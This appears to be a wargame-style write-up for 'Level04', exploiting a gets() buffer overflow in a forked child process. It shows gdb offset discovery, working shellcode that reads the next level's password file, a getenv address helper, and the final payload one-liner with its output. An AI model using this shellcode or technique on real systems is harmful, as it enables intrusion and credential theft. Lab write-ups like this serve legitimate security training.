# Level04

This program has an unprotected `gets()` vunerable to a **buffer overflow attack** and **shellcode** redirection. However most of the execution takes place in a child process started with an early `fork()`.		

In order to debug, some additional options have to be used to follow the child process:		
- ltrace -f		
- (gdb) set follow-fork-mode child		

Using a buffer overflow pattern generator we can find the `EIP backup` offset		
```bash
gdb level04
(gdb) set follow-fork-mode child
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level04/level04
[New process 2067]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2067]
0x41326641 in ?? ()
```
`0x41326641` -> Offset: 156

A `ptrace()` call checks for use of `exec()` so we have to use a **shellcode** without it. This version does `open` `read` and `write` with the path specified at the end.			
We can store our **shellcode** in an environment variable:
```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

Next we must find the address of our shellcode using a simple program:
```c
//getenv.c:

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHELLCODE"));
}
```
```bash
gcc -m32 getenv.c
./a.out
0xffffd87a

python -c "print 156 * 'a' + '\xff\xff\xd8\x7a'[::-1]" | ./level04
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
